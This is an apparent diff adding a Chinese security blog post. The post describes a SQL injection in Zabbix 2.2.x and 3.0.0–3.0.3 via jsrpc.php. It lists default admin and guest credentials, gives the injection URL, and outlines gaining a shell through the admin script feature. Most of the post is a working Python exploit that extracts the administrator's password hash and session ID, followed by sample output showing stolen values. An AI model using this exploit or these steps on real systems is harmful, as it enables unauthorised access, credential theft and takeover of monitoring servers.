@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="###漏洞详情 ###Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。可用于监视各种网络服务、服务器和网络机器等状态。本着其开源、安装简单等特点被广泛使用， zabbix安装完成后，超级管理员账号默认为： 用户名：Admin   密码：zabbix。 二、Guest用户  zabbix系统安装完成后，默认会有一个guest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ALL BLUE">
+<meta property="og:url" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="###漏洞详情 ###Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。可用于监视各种网络服务、服务器和网络机器等状态。本着其开源、安装简单等特点被广泛使用， zabbix安装完成后，超级管理员账号默认为： 用户名：Admin   密码：zabbix。 二、Guest用户  zabbix系统安装完成后，默认会有一个guest">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix%202.2.x,%203.0.0-3.0.3版本SQL注入漏洞/zabbix%202.2.x,%203.0.0-3.0.3版本SQL注入漏洞/zabbixSQL注入漏洞/20191129181122-986155fe-1290-1.png">
+<meta property="og:image" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix%202.2.x,%203.0.0-3.0.3版本SQL注入漏洞/zabbix%202.2.x,%203.0.0-3.0.3版本SQL注入漏洞/zabbixSQL注入漏洞/20191129181125-99ce7aac-1290-1.png">
+<meta property="og:image" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix%202.2.x,%203.0.0-3.0.3版本SQL注入漏洞/zabbix%202.2.x,%203.0.0-3.0.3版本SQL注入漏洞/zabbixSQL注入漏洞/20191129181125-99fc9798-1290-1.png">
+<meta property="og:image" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix%202.2.x,%203.0.0-3.0.3版本SQL注入漏洞/zabbix%202.2.x,%203.0.0-3.0.3版本SQL注入漏洞/zabbixSQL注入漏洞/20191129181125-9a309278-1290-1.png">
+<meta property="og:updated_time" content="2021-03-24T15:33:31.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ALL BLUE">
+<meta name="twitter:description" content="###漏洞详情 ###Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。可用于监视各种网络服务、服务器和网络机器等状态。本着其开源、安装简单等特点被广泛使用， zabbix安装完成后，超级管理员账号默认为： 用户名：Admin   密码：zabbix。 二、Guest用户  zabbix系统安装完成后，默认会有一个guest">
+<meta name="twitter:image" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix%202.2.x,%203.0.0-3.0.3版本SQL注入漏洞/zabbix%202.2.x,%203.0.0-3.0.3版本SQL注入漏洞/zabbixSQL注入漏洞/20191129181122-986155fe-1290-1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ALL BLUE</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2021/07/16/01-CMS漏洞/zabbix/zabbix后台getshell/zabbix后台getshell/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2021/07/16/01-CMS漏洞/Z-Blog/Z-Blog 1.5.1.1740存在XSS漏洞/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-16T03:12:39.697Z" itemprop="datePublished">2021-07-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>###漏洞详情 ###<br>Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。可用于监视各种网络服务、服务器和网络机器等状态。本着其开源、安装简单等特点被广泛使用， zabbix安装完成后，超级管理员账号默认为：</p>
+<pre><code>用户名：Admin   密码：zabbix。
+</code></pre><p>二、Guest用户<br>  zabbix系统安装完成后，默认会有一个guest账号：</p>
+<pre><code>用户名：guest   密码为空  ，只能看到zabbix后台，没有具体内容
+</code></pre><p>但zabbix 2.2.x, 3.0.0-3.0.3版本存在SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，进入后台后script等功能直接获取zabbix服务器的操作系统权限</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.访问的zabbix的地址后面加上如下url：</p>
+<pre><code>/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;tim
+estamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=hi
+story.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2&apos;3297&amp;updateProfil
+e=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=
+17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;
+mark_color=1
+</code></pre><p><img src="zabbixSQL注入漏洞/20191129181122-986155fe-1290-1.png" alt><br>输出结果，若包含：You have an error in your SQL syntax;表示漏洞存在。</p>
+<p>2.首先在Administration页面的scrpit功能栏创建script如下：<br><img src="zabbixSQL注入漏洞/20191129181125-99ce7aac-1290-1.png" alt></p>
+<p>3.然后重点在于找触发点，找到触发点才能执行。方法很多，这里拿常用的举例。<br><img src="zabbixSQL注入漏洞/20191129181125-99fc9798-1290-1.png" alt><br>4.执行成功后即可getshell。<br><img src="zabbixSQL注入漏洞/20191129181125-9a309278-1290-1.png" alt></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Date: 2016/8/18
+# Modified by: Jamin Zhang
+
+import urllib2
+import sys, os
+import re
+
+def deteck_Sql():
+u&apos;检查是否存在 SQL 注入&apos;
+payload = &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999&apos;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;
+try:
+response = urllib2.urlopen(url + payload, timeout=10).read()
+except Exception, msg:
+print msg
+else:
+key_reg = re.compile(r&quot;INSERT\s*INTO\s*profiles&quot;)
+if key_reg.findall(response):
+return True
+
+
+def sql_Inject(sql):
+u&apos;获取特定sql语句内容&apos;
+payload = url + &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=&quot; + urllib2.quote(
+sql) + &quot;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;
+try:
+response = urllib2.urlopen(payload, timeout=10).read()
+except Exception, msg:
+print msg
+else:
+result_reg = re.compile(r&quot;Duplicate\s*entry\s*&apos;~(.+?)~1&quot;)
+results = result_reg.findall(response)
+if results:
+return results[0]
+
+
+if __name__ == &apos;__main__&apos;:
+# os.system([&apos;clear&apos;, &apos;cls&apos;][os.name == &apos;nt&apos;])
+print &apos;+&apos; + &apos;-&apos; * 60 + &apos;+&apos;
+print u&apos;\t   Python Zabbix &lt; 3.0.4 SQL 注入 Exploit&apos;
+print &apos;\tOrigin Author: http://www.waitalone.cn/&apos;
+print &apos;\t\t   Modified by: Jamin Zhang&apos;
+print &apos;\t\t   Date: 2016-08-18&apos;
+print &apos;+&apos; + &apos;-&apos; * 60 + &apos;+&apos;
+if len(sys.argv) != 2:
+print u&apos;用法: &apos; + os.path.basename(sys.argv[0]) + u&apos; [Zabbix Server Web 后台 URL]&apos;
+print u&apos;实例: &apos; + os.path.basename(sys.argv[0]) + &apos; http://jaminzhang.github.io&apos;
+sys.exit()
+url = sys.argv[1]
+if url[-1] != &apos;/&apos;: url += &apos;/&apos;
+passwd_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;
+session_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;
+if deteck_Sql():
+print u&apos;Zabbix 存在 SQL 注入漏洞！\n&apos;
+print u&apos;管理员  用户名密码：%s&apos; % sql_Inject(passwd_sql)
+print u&apos;管理员  Session_id：%s&apos; % sql_Inject(session_sql)
+else:
+print u&apos;Zabbix 不存在 SQL 注入漏洞！\n&apos;
+</code></pre><p>以下为执行上述 Exp 脚本输出结果：</p>
+<pre><code>C:\Users\xxx\Desktop&gt;python zabbix_exp.py
++------------------------------------------------------------+
+   Python Zabbix &lt; 3.0.4 SQL 注入 Exploit
+   Origin Author: http://www.waitalone.cn/
+   Modified by: Jamin Zhang
+   Date: 2016-08-18
++------------------------------------------------------------+
+用法: zabbix_exp.py [Zabbix Server Web 后台 URL]
+实例: zabbix_exp.py http://jaminzhang.github.io
+
+C:\Users\xxx\Desktop&gt;python zabbix_exp.py http://192.168.56.11/zabbix
++------------------------------------------------------------+
+   Python Zabbix &lt; 3.0.4 SQL 注入 Exploit
+   Origin Author: http://www.waitalone.cn/
+   Modified by: Jamin Zhang
+   Date: 2016-08-18
++------------------------------------------------------------+
+Zabbix 存在 SQL 注入漏洞！
+
+管理员  用户名密码：Zabbix:5fce1b3e34b520afeffb37ce08c7cd66
+管理员  Session_id：16c9fe855b00a92112ae55cad58792c6
+</code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/6874" target="_blank" rel="noopener">https://xz.aliyun.com/t/6874</a><br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/" target="_blank" rel="noopener">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/zabbix/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/zabbix 2.2.x, 3.0.0-3.0.3版本SQL注入漏洞/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
